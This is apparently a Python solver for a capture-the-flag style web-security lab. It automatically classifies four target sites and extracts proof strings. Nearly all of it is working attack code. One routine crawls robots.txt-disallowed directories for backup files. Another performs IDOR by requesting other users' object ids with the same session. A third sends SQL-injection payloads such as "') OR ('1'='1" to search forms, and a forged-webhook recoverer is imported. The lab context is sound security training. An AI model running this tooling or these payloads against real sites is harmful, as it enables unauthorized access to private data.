#!/usr/bin/env python3
"""Day-26 Trust the Webhook mastery: 4 independently-classified targets.

Mastery is cumulative (docs/web-worker-lessons.md): the standing expectation is
backup exposure + IDOR + day-19 group-closing SQLi + the family's own class.
This solver classifies each target from its own live evidence and recovers the
proof - it does not assume a target's class from the challenge name.

Recoverers for the three recurring classes are ported here (stdlib-only) from
`solver_py_scripts/recovery_lib.py` per policy (port, don't import the shared
module against a live target); the family's own forged-webhook-event
recoverer is imported from this day's own solve.py.

Usage: mastery.py <evidence_root> <base1> <base2> <base3> <base4>
Prints, per argument order, "<base>\t<proof>\t<label>" lines.
"""
import json
import re
import sys
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from solve import Target, PROOF_RE, rec_forged_webhook_event  # noqa: E402
from html.parser import HTMLParser  # noqa: E402


class _Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for k, v in attrs:
                if k == "href" and v:
                    self.hrefs.append(v)


def rec_backup(t):
    """Root crawler-policy hint -> robots.txt Disallow -> open directory index ->
    named backup file -> proof. Ported from recovery_lib.rec_backup."""
    st, robots = t.request("/robots.txt", save="robots")
    if st != 200:
        return None
    for d in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots):
        d = "/" + d.strip("/") + "/"
        st, index = t.request(d, save="index" + d.replace("/", "_"))
        if st != 200:
            continue
        p = _Links()
        p.feed(index)
        members = [h for h in p.hrefs if h.rstrip("/").split("/")[-1]]
        members.sort(key=lambda h: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)", h, re.I) else 1)
        for href in members:
            path = href if href.startswith("/") else d + href
            st, body = t.request(path, save="file_" + path.strip("/").replace("/", "_"))
            if st != 200:
                continue
            m = PROOF_RE.search(body)
            if m:
                return m.group(0)
    return None


def rec_idor(t, html):
    """Session dashboard + activity feed disclosing a foreign object id; request it
    with the same cookie jar. Ported from recovery_lib.rec_idor."""
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    if not feed or not case_links:
        return None
    my_ids = {int(l.rsplit("/", 1)[1]) for l in case_links}
    st, case_page = t.request(case_links[0], save="mycase")
    inline = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', case_page)
    api_template = (inline.group(1), inline.group(3)) if inline else None
    st, feed_body = t.request(feed, save="feed")
    try:
        fj = json.loads(feed_body)
    except ValueError:
        return None
    me = fj.get("current_user")
    foreign = []
    for ev in fj.get("events", []):
        cid = ev.get("case_id") or ev.get("id")
        if cid is None:
            continue
        if (ev.get("owner") and ev.get("owner") != me) or \
                ev.get("visibility") == "reference_only" or cid not in my_ids:
            foreign.append(cid)

    def urls(cid):
        if api_template:
            yield f"{api_template[0]}{cid}{api_template[1]}"
        kind = case_links[0].rsplit("/", 2)[-2]
        yield f"/api/{kind}/{cid}"

    for cid in dict.fromkeys(foreign):
        for url in dict.fromkeys(urls(cid)):
            st, body = t.request(url, save=f"obj_{cid}")
            if st == 200:
                m = PROOF_RE.search(body)
                if m:
                    return m.group(0)
                break
    return None


def rec_sqli_group_close(t, html):
    """`/explore|/search|/lookup?q=` over a quoted LIKE clause; day-19's verbatim
    group-closing payload first. Ported from recovery_lib.rec_sqli_group_close."""
    am = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"]", html)
    nm = re.search(r"<input[^>]*name=['\"]([^'\"]+)['\"]", html)
    action = am.group(1) if am else "/search"
    name = nm.group(1) if nm else "q"
    for i, payload in enumerate(("') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1")):
        st, body = t.request(f"{action}?{urllib.parse.urlencode({name: payload})}", save=f"sqli_{i}")
        m = PROOF_RE.search(body)
        if m:
            return m.group(0)
    return None


def classify_and_solve(base, evidence_dir):
    t = Target(base, evidence_dir)
    st, html = t.request("/", save="root")
    if st != 200:
        return None, "root_failed"
    cst, clues = t.get_json("/api/clues", save="clues")
    if cst == 200 and isinstance(clues, dict) and clues.get("event_type") and clues.get("owner_scope"):
        p, _ = rec_forged_webhook_event(t, clues)
        if p:
            return p, "forged_webhook_event"
    if re.search(r'href="(/api/[^"]+)"', html) and re.findall(r'href="(/[a-z]+/\d+)"', html):
        p = rec_idor(t, html)
        if p:
            return p, "idor"
    if re.search(r"<form[^>]*action=['\"][^'\"]*(explore|search|lookup)", html, re.I):
        p = rec_sqli_group_close(t, html)
        if p:
            return p, "sqli_group_close"
    if re.search(r"crawler polic|robots", html, re.I):
        p = rec_backup(t)
        if p:
            return p, "backup_exposure"
    # fallbacks
    for fn, label in ((rec_backup, "backup_exposure"),
                      (lambda tt: rec_sqli_group_close(tt, html), "sqli_group_close")):
        try:
            p = fn(t)
            if p:
                return p, label + "_fallback"
        except TypeError:
            pass
    return None, "unclassified"


def main():
    ev_root = Path(sys.argv[1])
    bases = sys.argv[2:]
    for i, base in enumerate(bases, 1):
        proof, label = classify_and_solve(base, ev_root / f"target{i}")
        print(f"{base}\t{proof}\t{label}")


if __name__ == "__main__":
    main()
